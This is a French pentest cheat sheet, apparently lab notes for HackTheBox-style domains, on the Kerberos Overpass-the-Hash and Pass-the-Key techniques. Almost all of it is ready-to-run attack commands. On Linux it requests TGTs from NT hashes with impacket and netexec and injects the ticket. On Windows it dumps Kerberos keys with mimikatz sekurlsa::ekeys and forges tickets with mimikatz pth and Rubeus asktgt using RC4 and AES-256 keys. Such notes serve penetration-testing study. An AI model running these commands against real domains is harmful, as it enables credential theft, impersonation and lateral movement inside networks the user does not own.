
# Overpass The Hash / Pass the Key

> [!tip]
> Permet de forger un Ticket à l'aide du hash NT ou de la clé AES.
> 
> Overpass the Hash -> exploite le hash NT (RC4)
> Pass the Key -> exploite les clés DES, RC4, AES-128 et AES-256


# LINUX


## 1. Requête du TGT

#### Impacket

```bash
impacket-getTGT infiltrator.htb/e.rodriguez -hashes aad3b435b51404eeaad3b435b51404ee:b02e97f2fdb5c3d36f77375383449e56 -dc-ip dc01.infiltrator.htb
```
#### Netexec

```bash
nxc smb ip -u user -p password --generate-tgt /tmp/<user_tgt>
```

## 2. Injection du ticket #LINUX

```bash
export KRB5CCNAME=$path_to_ticket.ccache
```



# WINDOWS

## Mimikatz(admin)

Extraire les clés Kerberos AES & RC4

```cmd
.\mimikatz.exe privilege::debug sekurlsa::ekeys exit
```

Overpass The Hash (RC4)

```cmd
.\mimikatz.exe privilege::debug "sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f" exit
```

## Rubeus

Pass the Key (AES-256)

```cmd
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
```

Overpass The Hash (RC4)

```cmd
.\Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f
```

